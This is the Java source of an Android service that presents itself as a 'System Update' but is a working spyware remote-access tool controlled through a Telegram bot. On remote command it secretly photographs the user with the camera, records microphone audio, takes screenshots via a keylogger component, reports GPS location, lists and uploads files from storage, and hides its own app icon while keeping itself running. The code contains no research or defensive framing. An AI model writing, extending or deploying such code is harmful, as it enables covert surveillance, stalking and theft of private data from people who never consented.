package com.sys.updater;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class TelegramService extends Service {
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "sys")
                    .setContentTitle("System Update")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notification);
            }
        }
        
        Exfil.send("✅ Bot Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide");
        new Thread(this::pollTelegram).start();
    }

    private void pollTelegram() {
        while (isRunning) {
            try {
                String urlStr = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                InputStream is = new URL(urlStr).openStream();
                java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                String response = s.hasNext() ? s.next() : "";
                
                JSONObject json = new JSONObject(response);
                if (json.getBoolean("ok")) {
                    JSONArray result = json.getJSONArray("result");
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        if (update.has("message")) {
                            String text = update.getJSONObject("message").optString("text", "");
                            handleCommand(text);
                        }
                    }
                }
                Thread.sleep(2000);
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void handleCommand(final String cmd) {
        mainHandler.post(() -> {
            if (cmd.equals("/cam")) {
                takePhoto();
            } else if (cmd.equals("/mic")) {
                recordAudio();
            } else if (cmd.equals("/screenshot")) {
                if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen();
            } else if (cmd.equals("/loc")) {
                getLocation();
            } else if (cmd.equals("/files")) {
                listFiles();
            } else if (cmd.startsWith("/get ")) {
                String path = cmd.substring(5).trim();
                Exfil.send("Fetching: " + path);
                Exfil.sendFile(path, "Document", "File from " + path);
            } else if (cmd.equals("/hide")) {
                hideIcon();
            }
        });
    }

    // ================== LOCATION ==================
    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Exfil.send("❌ Location permission not granted.");
                return;
            }
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (loc != null) {
                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude();
                Exfil.send("📍 Location:\n" + mapsUrl);
            } else {
                Exfil.send("❌ Location not available. Try going outside or enable GPS.");
            }
        } catch (Exception e) {
            Exfil.send("Location Error: " + e.getMessage());
        }
    }

    // ================== FILE MANAGER ==================
    private void listFiles() {
        try {
            File dir = new File("/sdcard/Download"); // Tqder tbedel l'path hna
            if (!dir.exists()) dir = new File("/sdcard/");
            
            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder("📁 Files in " + dir.getAbsolutePath() + ":\n\n");
            if (files != null) {
                for (int i = 0; i < Math.min(files.length, 30); i++) {
                    sb.append(files[i].getName()).append("\n");
                }
                sb.append("\nUse `/get ").append(dir.getAbsolutePath()).append("/filename` to download.");
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {
            Exfil.send("File Error: " + e.getMessage());
        }
    }

    // ================== STEALTH MODE ==================
    private void hideIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            Exfil.send("🕵️ App icon hidden. App still running in background.");
        } catch (Exception e) {
            Exfil.send("Hide Error: " + e.getMessage());
        }
    }

    // ================== CAMERA ==================
    private void takePhoto() {
        Exfil.send("📷 Opening Camera...");
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1];
            
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(reader.getSurface());
                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                        try { session.capture(builder.build(), null, null); } catch (Exception e) {}
                                    }, 1000);
                                    
                                    reader.setOnImageAvailableListener(r -> {
                                        Image image = r.acquireLatestImage();
                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                        byte[] bytes = new byte[buffer.remaining()];
                                        buffer.get(bytes);
                                        try {
                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
                                            FileOutputStream fos = new FileOutputStream(f);
                                            fos.write(bytes); fos.close();
                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
                                        } catch (Exception e) {}
                                        image.close(); camera.close();
                                    }, null);
                                } catch (Exception e) {}
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
                        }, null);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) {}
            }, null);
        } catch (Exception e) {}
    }

    // ================== MIC ==================
    private void recordAudio() {
        try {
            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare(); recorder.start();
            Exfil.send("🎙️ Recording 10s...");
            
            new Thread(() -> {
                try { Thread.sleep(10000); } catch (Exception e) {}
                mainHandler.post(() -> {
                    try {
                        recorder.stop(); recorder.release();
                        Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record");
                    } catch (Exception e) {}
                });
            }).start();
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
